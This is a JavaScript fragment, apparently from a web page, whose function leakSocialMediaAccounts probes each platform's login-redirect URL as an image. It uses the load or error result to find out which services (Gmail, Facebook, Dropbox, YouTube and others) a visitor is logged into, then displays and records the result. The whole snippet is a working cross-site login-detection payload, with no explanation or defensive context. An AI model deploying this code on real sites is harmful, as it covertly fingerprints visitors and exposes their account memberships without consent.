var leakSocialMediaAccounts = function(callback) {

    platforms.forEach(function(network) {
        var img = document.createElement('img');
        img.src = network.domain + network.redirect;
        img.onload = function() {
            callback(network, true);
            totalSites++;
        };
        img.onerror = function() {
            callback(network, false);
            totalSites++;
        };
    });
};
//var isFirstLoggedIn = true;

function displayResult(network, loggedIn) {
    var id = 'loggedIn';
    var favicon = faviconUri(network);
    var url = network.domain + network.redirect;
    var el = '<a id="links" target="_blank" href="' + url + '" target="_blank" class=network><img style="padding: 10px;" width=50 class="rounded" src=' + favicon + '><!--<span>' + network.name + '</span>--></a>';
    if (loggedIn /*&& isFirstLoggedIn*/) {
        //isFirstLoggedIn = false;
        mainset[network.name] = 1
        document.getElementById(id).innerHTML += el;
    }else{
      document.getElementById("failed").innerHTML += el;
    }
}

function faviconUri(network) {
    var favicon = network.domain + '/favicon.ico';
    if (network.name === 'Dropbox') {
        favicon = 'https://www.dropbox.com/static/images/favicon.ico';
    }
    if (network.name === 'Youtube') {
        favicon = 'https://www.youtube.com/favicon.ico';
    }
    if (network.name === 'Gmail') {
        favicon = 'https://mail.google.com/favicon.ico';
    }
    if (network.name == 'Facebook'){
        favicon = 'https://facebook.com/favicon.ico';
    }return favicon;
}
